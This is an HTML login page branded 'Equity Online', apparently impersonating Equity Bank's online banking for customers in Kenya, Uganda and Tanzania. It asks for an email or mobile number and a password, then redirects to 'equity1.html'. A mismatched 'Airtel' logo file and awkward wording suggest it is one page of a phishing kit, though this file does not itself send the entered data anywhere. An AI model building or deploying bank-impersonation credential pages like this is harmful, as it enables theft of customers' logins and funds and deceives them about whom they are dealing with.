<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <title>Equity Online</title>
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            display: flex;
            height: 100vh;
            background-color: #f7f7f7;
        }
        
        .left-section {
            flex: 2;
            background: #C8102E;
            /* Dark Red */
            display: flex;
            justify-content: flex-start;
            align-items: center;
            padding: 40px;
            color: white;
        }
        
        .right-section {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-form {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
        }
        
        .login-form h2 {
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        
        input[type="text"],
        input[type="password"],
        select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        
        button {
            width: 100%;
            padding: 10px;
            background-color: #C8102E;
            /* Dark Red */
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }
        
        button:hover {
            background-color: #A50F20;
            /* Darker Red */
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        
        .footer a {
            color: #C8102E;
            text-decoration: none;
        }
        
        .logo {
            max-width: 150px;
            /* Adjust the size as needed */
            margin-bottom: 20px;
        }
    </style>
</head>

<body>

    <div class="left-section">
        <div>
            <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
            <!-- Replace with actual logo URL -->
            <h1>Welcome to Equity online</h1>
            <p>More than just banking.</p>
        </div>
    </div>
    <div class="right-section">
        <div class="login-form">
            <h2>Login Equity As on App</h2>
            <div class="form-group">
                <label for="country">Country</label>
                <select id="country">
                <option value="Kenya">Kenya</option>
                <option value="Uganda">Uganda</option>
                <option value="Tanzania">Tanzania</option>
            </select>
            </div>
            <div class="form-group">
                <label for="email">Email address or mobile number</label>
                <input type="text" id="email" placeholder="Email address or mobile number" required>
            </div>
            <div class="form-group">
                <label for="password">Enter password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>
            <button id="signin-button">Login Equity</button>
            <p class="footer"><a href="#">Forgot your password?</a> | <a href="#">Register</a></p>
            <p class="footer">English</p>
        </div>
    </div>

    <script>
        document.getElementById('signin-button').addEventListener('click', function() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            if (email && password) {
                // Redirect to equity1.html
                window.location.href = "equity1.html";
            } else {
                alert('Please fill in all fields.');
            }
        });
    </script>

</body>

</html>
